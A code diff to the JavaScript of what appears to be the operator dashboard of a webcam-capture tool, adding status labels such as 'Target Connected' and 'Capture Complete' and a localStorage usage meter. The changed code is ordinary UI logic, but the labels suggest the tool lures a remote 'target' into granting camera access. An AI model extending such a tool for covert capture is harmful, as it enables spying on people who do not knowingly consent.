@@ -30,6 +30,7 @@ window.addEventListener('DOMContentLoaded', () => {
     setInterval(() => {
         pollCaptures();
         pollStatus();
+        checkStorage();
     }, 2000);
 });
 
@@ -99,9 +100,18 @@ function pollStatus() {
         if (status === 'permission_granted' || status === 'capturing' || status === 'done') markStep(3, true);
         if (status === 'done') markStep(4, true);
 
-        // If capturing or done, ensure waiting state is progressing or hidden
-        if (status === 'capturing' || status === 'done') {
-            // Optional: add a "Capturing..." label to the radar if you want
+        // Update status label on radar
+        const statusLabel = document.getElementById('statusLabel');
+        if (statusLabel) {
+            let labelText = 'Initializing...';
+            if (status === 'connected') labelText = 'Target Connected';
+            if (status === 'retrying') labelText = 'Retrying Camera...';
+            if (status === 'permission_granted') labelText = 'Access Granted';
+            if (status === 'capturing') labelText = 'Capturing...';
+            if (status === 'done') labelText = 'Capture Complete';
+            if (status === 'browser_blocked') labelText = 'Blocked (Insecure Context)';
+            if (status === 'permission_denied') labelText = 'Permission Denied';
+            statusLabel.textContent = labelText;
         }
     } catch { }
 }
@@ -300,6 +310,22 @@ document.addEventListener('keydown', e => {
     if (e.key === 'ArrowRight') lightboxNext();
     if (e.key === 'Escape') closeLightbox();
 });
+
+// ---- Storage Management ----
+function checkStorage() {
+    let total = 0;
+    for (let k in localStorage) {
+        if (localStorage.hasOwnProperty(k)) total += (localStorage[k].length * 2);
+    }
+    const mb = (total / 1024 / 1024).toFixed(2);
+    const pct = Math.min((total / (5 * 1024 * 1024)) * 100, 100).toFixed(0);
+
+    const el = document.getElementById('storageUse');
+    if (el) {
+        el.textContent = `${mb} MB (${pct}%)`;
+        el.parentElement.style.color = pct > 80 ? '#ef4444' : 'inherit';
+    }
+}
 
 // ---- Toast ----
 function showToast(msg) {
